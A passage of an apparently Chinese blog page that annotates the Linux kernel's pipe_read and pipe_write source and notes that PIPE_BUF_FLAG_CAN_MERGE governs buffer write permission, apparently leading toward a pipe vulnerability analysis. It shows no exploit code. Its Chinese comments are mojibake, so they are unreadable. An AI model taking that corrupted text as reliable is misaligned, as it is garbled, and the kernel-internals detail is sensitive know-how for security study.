class="hljs-comment">//Áî®‰∫éËÆ∞ÂΩïÁÆ°ÈÅìÊòØÂê¶Êª°‰∫Ü‰ª•ÂèäÊòØÂê¶ÈúÄË¶ÅÂî§ÈÜí‰∏ã‰∏Ä‰∏™ËØªÂèñËÄÖ„ÄÇ</span><br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-comment">/* Null read succeeds. */</span><br>    <span class="hljs-comment">//Â¶ÇÊûú total_len ‰∏∫Èõ∂ÔºåË°®Á§∫ËØ∑Ê±ÇÁöÑËØªÂèñÈïøÂ∫¶‰∏∫Èõ∂ÔºåÁõ¥Êé•ËøîÂõûÈõ∂ÔºåË°®Á§∫ËØªÂèñÊàêÂäü</span><br>	<span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//‰ΩøÁî® __pipe_lock ÂáΩÊï∞ÈîÅÂÆöÁÆ°ÈÅìÔºå‰ª•Á°Æ‰øùÂú®Â§öÁ∫øÁ®ãÁéØÂ¢É‰∏ãÂØπÁÆ°ÈÅìÁöÑÂÆâÂÖ®ËÆøÈóÆ</span><br>	__pipe_lock(pipe);<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * We only wake up writers if the pipe was full when we started</span><br><span class="hljs-comment">	 * reading in order to avoid unnecessary wakeups.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * But when we do wake up writers, we do so using a sync wakeup</span><br><span class="hljs-comment">	 * (WF_SYNC), because we want them to get going and generate more</span><br><span class="hljs-comment">	 * data for us.</span><br><span class="hljs-comment">	 */</span><br>    <span class="hljs-comment">//Â¶ÇÊûúÁÆ°ÈÅìÁöÑÂ§¥ÈÉ®ÊåáÈíàÁ≠â‰∫éÂ∞æÈÉ®ÊåáÈíàÂä†‰∏äÊúÄÂ§ß‰ΩøÁî®ÈáèÔºåÂàôË°®Á§∫ÁÆ°ÈÅìÂ∑≤Êª°</span><br>	was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>    <span class="hljs-comment">//Êó†ÈôêÂæ™ÁéØ‰∏≠ÔºåÂ∞ùËØï‰ªéÁÆ°ÈÅì‰∏≠ËØªÂèñÊï∞ÊçÆÔºåÁõ¥Âà∞ËØªÂèñÂÆåÊàêÊàñÂá∫Áé∞ÈîôËØØ</span><br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">/*head Ë°®Á§∫ÁÆ°ÈÅì‰∏≠‰∏ã‰∏Ä‰∏™Ë¶ÅËØªÂèñÁöÑÊï∞ÊçÆ‰ΩçÁΩÆ„ÄÇ</span><br><span class="hljs-comment">		tail Ë°®Á§∫ÁÆ°ÈÅì‰∏≠‰∏ã‰∏Ä‰∏™Ë¶ÅÂÜôÂÖ•Êï∞ÊçÆÁöÑ‰ΩçÁΩÆ„ÄÇ</span><br><span class="hljs-comment">		mask ÊòØ‰∏Ä‰∏™Êé©Á†ÅÔºåÁî®‰∫éËÆ°ÁÆóÁ¥¢ÂºïÔºåÁ°Æ‰øùÁ¥¢Âºï‰∏ç‰ºöË∂ÖÂá∫ÁºìÂÜ≤Âå∫ÁöÑËåÉÂõ¥„ÄÇ*/</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head = pipe-&gt;head;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail = pipe-&gt;tail;<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>        <span class="hljs-comment">//Â¶ÇÊûúÁÆ°ÈÅìÁöÑ note_loss Ê†áÂøó‰∏∫ÁúüÔºåÂπ∂‰∏îÂæÖËØªÂèñÊï∞ÊçÆÈïøÂ∫¶Â∞è‰∫é 8ÔºåËØ¥ÊòéÁºìÂÜ≤Âå∫Á©∫Èó¥‰∏çË∂≥ÔºåËøîÂõûÈîôËØØÁ†Å -ENOBUFS„ÄÇ</span><br>		<span class="hljs-keyword">if</span> (pipe-&gt;note_loss) &#123;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">watch_notification</span> <span class="hljs-title">n</span>;</span><br><br>			<span class="hljs-keyword">if</span> (total_len &lt; <span class="hljs-number">8</span>) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -ENOBUFS;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br><br>			n.type = WATCH_TYPE_META;<br>			n.subtype = WATCH_META_LOSS_NOTIFICATION;<br>			n.info = watch_sizeof(n);<br>			<span class="hljs-keyword">if</span> (copy_to_iter(&amp;n, <span class="hljs-keyword">sizeof</span>(n), to) != <span class="hljs-keyword">sizeof</span>(n)) &#123;<br>				<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			ret += <span class="hljs-keyword">sizeof</span>(n);<br>			total_len -= <span class="hljs-keyword">sizeof</span>(n);<br>			pipe-&gt;note_loss = <span class="hljs-literal">false</span>;<br>		&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		<span class="hljs-comment">//Â¶ÇÊûúÁÆ°ÈÅìÈùûÁ©∫ÔºåÂ∞ùËØï‰ªéÁÆ°ÈÅì‰∏≠ËØªÂèñÊï∞ÊçÆ</span><br>		<span class="hljs-keyword">if</span> (!pipe_empty(head, tail)) &#123;<br>            <br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];<span class="hljs-comment">//Ëé∑ÂèñÂΩìÂâçÂ∞æÈÉ®ÊåáÈíà tail ÂØπÂ∫îÁöÑÁÆ°ÈÅìÁºìÂÜ≤Âå∫ buf                                     </span><br>			<span class="hljs-type">size_t</span> chars = buf-&gt;len;<span class="hljs-comment">//ËÆ°ÁÆóÂΩìÂâçÁºìÂÜ≤Âå∫‰∏≠ÂèØËØªÂèñÁöÑÊï∞ÊçÆÈïøÂ∫¶ chars</span><br>			<span class="hljs-type">size_t</span> written;<br>			<span class="hljs-type">int</span> error;<br>			<span class="hljs-comment">//Â¶ÇÊûúÁºìÂÜ≤Âå∫‰∏≠ÁöÑÊï∞ÊçÆÈïøÂ∫¶Â§ß‰∫éÂæÖËØªÂèñÊï∞ÊçÆÈïøÂ∫¶ total_lenÔºåÂàôÂ∞ÜÂæÖËØªÂèñÊï∞ÊçÆÈïøÂ∫¶Êõ¥Êñ∞‰∏∫ total_len</span><br>			<span class="hljs-keyword">if</span> (chars &gt; total_len) &#123;<br>				<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;<br>					<span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>						ret = -ENOBUFS;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				chars = total_len;<br>			&#125;<br>			<span class="hljs-comment">//Á°ÆËÆ§ÁÆ°ÈÅìÁºìÂÜ≤Âå∫</span><br>			error = pipe_buf_confirm(pipe, buf);<br>			<span class="hljs-keyword">if</span> (error) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = error;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>			<span class="hljs-comment">//‰ªéÁºìÂÜ≤Âå∫‰∏≠ËØªÂèñÊï∞ÊçÆÂà∞ÁõÆÊ†áÁºìÂÜ≤Âå∫ to</span><br>			written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);<br>			<span class="hljs-keyword">if</span> (unlikely(written &lt; chars)) &#123;<br>				<span class="hljs-keyword">if</span> (!ret)<br>					ret = -EFAULT;<br>				<span class="hljs-keyword">break</span>;<br>			&#125;<br>            <span class="hljs-comment">//Êõ¥Êñ∞ËøîÂõûÂÄº ret„ÄÅÁÆ°ÈÅìÁºìÂÜ≤Âå∫‰∏≠ÁöÑÂÅèÁßªÈáèÂíåÈïøÂ∫¶ÔºåÂπ∂Ê∏ÖÁêÜÁ©∫ÁöÑÊï∞ÊçÆÂåÖÁºìÂÜ≤Âå∫</span><br>			ret += chars;<br>			buf-&gt;offset += chars;<br>			buf-&gt;len -= chars;<br><br>			<span class="hljs-comment">/* Was it a packet buffer? Clean up and exit */</span><br>			<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;<br>				total_len = chars;<br>				buf-&gt;len = <span class="hljs-number">0</span>;<br>			&#125;<br>			<span class="hljs-comment">//Â¶ÇÊûúÁºìÂÜ≤Âå∫Â∑≤Á©∫ÔºåÂàôÈáäÊîæÁºìÂÜ≤Âå∫ÔºåÂπ∂Êõ¥Êñ∞Â∞æÈÉ®ÊåáÈíà tail</span><br>			<span class="hljs-keyword">if</span> (!buf-&gt;len) &#123;<br>				pipe_buf_release(pipe, buf);<br>				spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>				<span class="hljs-keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)<br>					pipe-&gt;note_loss = <span class="hljs-literal">true</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>				tail++;<br>				pipe-&gt;tail = tail;<br>				spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>			&#125;<br>            <span class="hljs-comment">//Êõ¥Êñ∞ÂæÖËØªÂèñÊï∞ÊçÆÈïøÂ∫¶ total_len</span><br>			total_len -= chars;<br>            <span class="hljs-comment">//Â¶ÇÊûúËØªÂèñÂÆåÊàêÔºåÂàôË∑≥Âá∫Âæ™ÁéØÔºõÂê¶ÂàôÁªßÁª≠Â∞ùËØïËØªÂèñÊõ¥Â§öÊï∞ÊçÆ</span><br>			<span class="hljs-keyword">if</span> (!total_len)<br>				<span class="hljs-keyword">break</span>;	<span class="hljs-comment">/* common path: read succeeded */</span><br>			<span class="hljs-keyword">if</span> (!pipe_empty(head, tail))	<span class="hljs-comment">/* More to do? */</span><br>				<span class="hljs-keyword">continue</span>;<br>		&#125;<br>		<span class="hljs-comment">//Â¶ÇÊûúÁÆ°ÈÅì‰∏≠Ê≤°ÊúâÂÜôÂÖ•ËÄÖÔºåË∑≥Âá∫Âæ™ÁéØ</span><br>		<span class="hljs-keyword">if</span> (!pipe-&gt;writers)<br>			<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//Â¶ÇÊûúÂá∫Áé∞ÈîôËØØÊàñÂ∑≤ÁªèËØªÂèñÂà∞Êï∞ÊçÆÔºåÂàôË∑≥Âá∫Âæ™ÁéØ</span><br>		<span class="hljs-keyword">if</span> (ret)<br>			<span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//Â¶ÇÊûúÊñá‰ª∂Ê†áÂøó‰∏∫ÈùûÈòªÂ°ûÔºåÂπ∂‰∏îÁÆ°ÈÅì‰∏∫Á©∫ÔºåÂàôËøîÂõûÈîôËØØÁ†Å -EAGAIN</span><br>		<span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>			ret = -EAGAIN;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		__pipe_unlock(pipe);<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We only get here if we didn&#x27;t actually read anything.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * However, we could have seen (and removed) a zero-sized</span><br><span class="hljs-comment">		 * pipe buffer, and might have made space in the buffers</span><br><span class="hljs-comment">		 * that way.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * You can&#x27;t make zero-sized pipe buffers by doing an empty</span><br><span class="hljs-comment">		 * write (not even in packet mode), but they can happen if</span><br><span class="hljs-comment">		 * the writer gets an EFAULT when trying to fill a buffer</span><br><span class="hljs-comment">		 * that already got allocated and inserted in the buffer</span><br><span class="hljs-comment">		 * array.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * So we still need to wake up any pending writers in the</span><br><span class="hljs-comment">		 * _very_ unlikely case that the pipe was full, but we got</span><br><span class="hljs-comment">		 * no data.</span><br><span class="hljs-comment">		 */</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Âú®ÈáäÊîæÈîÅÁöÑÊÉÖÂÜµ‰∏ãÂ§ÑÁêÜÊú™ËØªÂèñ‰ªª‰ΩïÊï∞ÊçÆÁöÑÊÉÖÂÜµÔºö</span><br><span class="hljs-comment">		Â¶ÇÊûú‰πãÂâçÁÆ°ÈÅìÂ∑≤Êª°‰ΩÜÊú™ËØªÂèñ‰ªª‰ΩïÊï∞ÊçÆÔºåÂàôÂî§ÈÜíÁ≠âÂæÖÁöÑÂÜôÂÖ•ËÄÖÂπ∂ÂèëÈÄÅÂºÇÊ≠•ÈÄöÁü•„ÄÇ</span><br><span class="hljs-comment">		Â¶ÇÊûúÂõ†‰∏≠Êñ≠ËÄåÈÄÄÂá∫ÔºåÂàôËøîÂõûÈîôËØØÁ†Å -ERESTARTSYS</span><br><span class="hljs-comment">		*/</span><br>		<span class="hljs-keyword">if</span> (unlikely(was_full)) &#123;<br>			wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>			kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>		&#125;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * But because we didn&#x27;t read anything, at this point we can</span><br><span class="hljs-comment">		 * just return directly with -ERESTARTSYS if we&#x27;re interrupted,</span><br><span class="hljs-comment">		 * since we&#x27;ve done any required wakeups and there&#x27;s no need</span><br><span class="hljs-comment">		 * to mark anything accessed. And we&#x27;ve dropped the lock.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (wait_event_interruptible_exclusive(pipe-&gt;rd_wait, pipe_readable(pipe)) &lt; <span class="hljs-number">0</span>)<br>			<span class="hljs-keyword">return</span> -ERESTARTSYS;<br><br>		__pipe_lock(pipe);<br>		was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);<br>		wake_next_reader = <span class="hljs-literal">true</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (pipe_empty(pipe-&gt;head, pipe-&gt;tail))<br>		wake_next_reader = <span class="hljs-literal">false</span>;<br>	__pipe_unlock(pipe);<br><br>	<span class="hljs-keyword">if</span> (was_full) &#123;<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);<br>		kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (wake_next_reader)<br>		wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>		file_accessed(filp);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h3><p>Âêëpipe‰∏≠ÂÜôÂÖ•Ôºå‰ºöË∞ÉÁî®Âà∞pipe_write</p>
<p>È¶ñÂÖàÔºåÂ¶ÇÊûú‰∏ä‰∏Ä‰∏™buffer‰∏≠ÊúâÂâ©‰ΩôÁ©∫Èó¥ÔºåÂπ∂‰∏îÊ≠§bufferÁöÑflagÊòØ<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>Ôºå‰ºöÂÖàÂ∞ÜÊ≠§bufferÂÜôÊª°</p>
<p>Ëã•ËøòÊúâÂ§öÁöÑÊï∞ÊçÆÔºå‰ºöÁî≥ËØ∑Êñ∞ÁöÑbufferÔºåÂ∞ÜflagËÆæÁΩÆ‰∏∫<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ÔºåÁªßÁª≠ÂÜôÂÖ•</p>
<p>Áî±Ê≠§ÂèØËßÅÔºå<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>ÂÜ≥ÂÆö‰∫ÜbufferÊúâÊó†ÂÜôÂÖ•ÊùÉÈôê</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span> =</span> iocb-&gt;ki_filp;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br>	<span class="hljs-type">ssize_t</span> ret = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">size_t</span> total_len = iov_iter_count(from);<br>	<span class="hljs-type">ssize_t</span> chars;<br>	<span class="hljs-type">bool</span> was_empty = <span class="hljs-literal">false</span>;<br>	<span class="hljs-type">bool</span> wake_next_writer = <span class="hljs-literal">false</span>;<br><br>	<span class="hljs-comment">/* Null write succeeds. */</span><br>    <span class="hljs-comment">//Â¶ÇÊûúÂæÖÂÜôÂÖ•Êï∞ÊçÆÈïøÂ∫¶‰∏∫Èõ∂ÔºåÂàôÁõ¥Êé•ËøîÂõûÊàêÂäü</span><br>	<span class="hljs-keyword">if</span> (unlikely(total_len == <span class="hljs-number">0</span>))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-comment">//ÈîÅÂÆöÁÆ°ÈÅì‰ª•Á°Æ‰øùÂπ∂ÂèëÂÜôÂÖ•Êó∂ÁöÑÊï∞ÊçÆ‰∏ÄËá¥ÊÄß</span><br>	__pipe_lock(pipe);<br>	<span class="hljs-comment">//Ê£ÄÊü•ÊòØÂê¶ÊúâËØªÂèñËÄÖÔºåÂ¶ÇÊûúÊ≤°ÊúâËØªÂèñËÄÖÔºåÂàôÂèëÈÄÅ SIGPIPE ‰ø°Âè∑Âπ∂ËøîÂõûÈîôËØØÁ†Å -EPIPE</span><br>	<span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>		send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>		ret = -EPIPE;<br>		<span class="hljs-keyword">goto</span> out;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br>    <span class="hljs-comment">//Ê£ÄÊü•ÊòØÂê¶ÂêØÁî®‰∫ÜÁõëËßÜÈòüÂàóÔºåÂ¶ÇÊûúÂêØÁî®‰∫ÜÔºåÂàôËøîÂõûÈîôËØØÁ†Å -EXDEV</span><br>	<span class="hljs-keyword">if</span> (pipe-&gt;watch_queue) &#123;<br>		ret = -EXDEV;<br>		<span class="hljs-keyword">goto</span> out;<br>	&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Only wake up if the pipe started out empty, since</span><br><span class="hljs-comment">	 * otherwise there should be no readers waiting.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * If it wasn&#x27;t empty we try to merge new data into</span><br><span class="hljs-comment">	 * the last buffer.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * That naturally merges small writes, but it also</span><br><span class="hljs-comment">	 * page-aligs the rest of the writes for large writes</span><br><span class="hljs-comment">	 * spanning multiple pages.</span><br><span class="hljs-comment">	 */</span><br>	head = pipe-&gt;head;<br>	was_empty = pipe_empty(head, pipe-&gt;tail);<span class="hljs-comment">//Âà§Êñ≠ÁÆ°ÈÅìÊòØÂê¶‰∏∫Á©∫ÔºåÂ¶ÇÊûú‰∏∫Á©∫ÔºåÂàôÊ†áËÆ∞ was_empty ‰∏∫Áúü</span><br>	chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br>	<span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="hljs-comment">//Â¶ÇÊûúÊñ∞Êï∞ÊçÆÈïøÂ∫¶‰∏ç‰∏∫Èõ∂‰∏îÁÆ°ÈÅì‰∏ç‰∏∫Á©∫ÔºåÂàôÂ∞ùËØïÂ∞ÜÊñ∞Êï∞ÊçÆ‰∏é‰∏ä‰∏Ä‰∏™ÁºìÂÜ≤Âå∫ÂêàÂπ∂</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>		<span class="hljs-type">int</span> offset = buf-&gt;offset + buf-&gt;len;<br>		<span class="hljs-comment">//Â¶ÇÊûúflag‰∏≠ÊúâPIPE_BUF_FLAG_CAN_MERGEÔºå‰æøÊääÊï∞ÊçÆÂÜôÂÖ•‰∏ä‰∏Ä‰∏™bufferÁöÑÂâ©‰ΩôÁ©∫Èó¥‰∏≠</span><br>		<span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>		    offset + chars &lt;= PAGE_SIZE) &#123;<br>			ret = pipe_buf_confirm(pipe, buf);<br>			<span class="hljs-keyword">if</span> (ret)<br>				<span class="hljs-keyword">goto</span> out;<br><br>			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<span class="hljs-comment">//Êã∑Ë¥ùËøõÂéª</span><br>			<span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>				ret = -EFAULT;<br>				<span class="hljs-keyword">goto</span> out;<br>			&#125;<br><br>			buf-&gt;len += ret;<br>			<span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>				<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br>	<span class="hljs-comment">//ËøõÂÖ•‰∏Ä‰∏™Êó†ÈôêÂæ™ÁéØÔºåÁõ¥Âà∞ÊàêÂäüÂÜôÂÖ•Êï∞ÊçÆÊàñÈÅáÂà∞ÈîôËØØ</span><br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">//Ê£ÄÊü•ÊòØÂê¶ÊúâËØªÂèñËÄÖÔºåÂ¶ÇÊûúÊ≤°ÊúâËØªÂèñËÄÖÔºåÂàôÂèëÈÄÅ SIGPIPE ‰ø°Âè∑Âπ∂ËøîÂõûÈîôËØØÁ†Å -EPIPE</span><br>		<span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>			send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>			<span class="hljs-keyword">if</span> (!ret)<br>				ret = -EPIPE;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">//Ê£ÄÊü•ÁÆ°ÈÅìÊòØÂê¶Êú™Êª°ÔºåÂ¶ÇÊûúÊú™Êª°ÔºåÂàôÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÁºìÂÜ≤Âå∫Áî®‰∫éÂÜôÂÖ•Êï∞ÊçÆ</span><br>		head = pipe-&gt;head;<br>		<span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>			<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>			<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>			<span class="hljs-type">int</span> copied;<br><br>			<span class="hljs-keyword">if</span> (!page) &#123;<br>				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>				<span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>					ret = ret ? : -ENOMEM;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<br>				pipe-&gt;tmp_page = page;<br>			&#125;<br><br>			<span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment">			 * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment">			 * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">			 * be there for the next write.</span><br><span class="hljs-comment">			 */</span><br>			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>			head = pipe-&gt;head;<br>			<span 